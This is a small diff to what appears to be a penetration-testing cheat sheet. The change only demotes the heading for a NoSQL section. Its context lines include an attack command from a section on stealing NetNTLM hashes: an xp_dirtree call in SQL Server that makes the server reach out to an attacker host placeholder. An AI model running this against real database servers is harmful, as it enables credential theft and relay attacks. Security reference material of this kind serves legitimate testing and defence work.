@@ -304,7 +304,7 @@ Steal NetNTLM Hash /Relay Attack
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
-# NoSQL (MongoDB, CouchDB)
+## NoSQL (MongoDB, CouchDB)
 ```
 bash
 # Tools
